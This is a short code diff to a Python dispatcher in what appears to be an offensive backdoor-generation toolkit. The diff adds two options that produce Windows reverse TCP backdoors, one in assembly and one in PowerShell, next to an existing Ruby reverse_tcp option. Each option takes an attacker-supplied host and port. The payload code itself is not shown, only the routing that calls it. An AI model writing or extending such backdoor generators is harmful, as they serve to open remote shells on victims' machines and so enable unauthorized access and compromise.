@@ -60,6 +60,15 @@ def process( data, HOST, PORT, logger=True):
 		from .backdoors.main import rbreverse_tcp
 		extension = "rb"
 		logs = rbreverse_tcp( HOST,PORT)
+	elif data == "backdoors/windows/asm/reverse_tcp":
+		from .backdoors.main import asmreverse_tcp
+		extension = "s"
+		logs = asmreverse_tcp( HOST,PORT)
+	elif data == "backdoors/windows/powershell/reverse_tcp":
+		from .backdoors.main import powershell
+		extension = "ps1"
+		logs = powershell( HOST,PORT)
+
 
 
 	savefile = [logfile if logger != True else logfile+extension]
